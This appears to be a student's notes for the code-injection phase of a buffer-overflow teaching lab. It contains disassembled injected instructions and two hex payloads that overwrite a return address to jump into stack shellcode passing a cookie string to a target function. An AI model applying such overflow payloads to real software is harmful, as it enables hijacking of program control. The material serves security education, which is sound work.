
; phase3.o:     file format elf64-x86-64


; Disassembly of section .text:

; 0000000000000000 <.text>:
;    0:	48 8b 3c 25 a8 dc 61 	mov    0x5561dca8,%rdi  // 要加 上$
;    7:	55 
;    8:	ff 34 25 fa 18 40 00 	pushq  0x4018fa
;    f:	c3                   	retq   
; phase3.o:     file format elf64-x86-64


; Disassembly of section .text:

; 0000000000000000 <.text>:
;    0:	48 8b 3c 25 a8 dc 61 	mov    0x5561dca8,%rdi
;    7:	55 
;    8:	ff 34 25 fa 18 40 00 	pushq  0x4018fa
;    f:	c3                   	retq   


; phase3.o:     file format elf64-x86-64


; Disassembly of section .text:

; 0000000000000000 <.text>:
;    0:	ff 34 25 fa 18 40 00 	pushq  0x4018fa
;    7:	48 8b 3c 25 a8 dc 61 	mov    0x5561dca8,%rdi
;    e:	55 
;    f:	c3                   	retq   

phase3.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:	48 c7 c7 a8 dc 61 55 	mov    $0x5561dca8,%rdi
   7:	68 fa 18 40 00       	pushq  $0x4018fa
   c:	c3                   	retq   

phase3.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:	48 89 e7             	mov    %rsp,%rdi
   3:	68 fa 18 40 00       	pushq  $0x4018fa
   8:	c3                   	retq   


answer:
48 c7 c7 a8 dc 61 55  /* mov    $0x5561dca8,%rdi, addr of string  */
68 fa 18 40 00       /* pushq  $0x4018fa; addr of touch3*/
c3                   /* retq  */
61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 
/* 27 bytes of padding */
78 dc 61 55 00 00 00 00  /* overwrite ret addr to test; false return addr to buf */
35 39 62 39 39 37 66 61 00   /* string 59b997fa\0 */

answer:
48 89 e7         /* mov    %rsp,%rdi */
68 fa 18 40 00    /* pushq  $0x4018fa */
c3                /* retq */
61 61 61 61 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 
/* 31 bytes of padding */
78 dc 61 55 00 00 00 00  /* overwrite ret addr to test; false return addr to buf */
35 39 62 39 39 37 66 61 00   /* string 59b997fa\0 */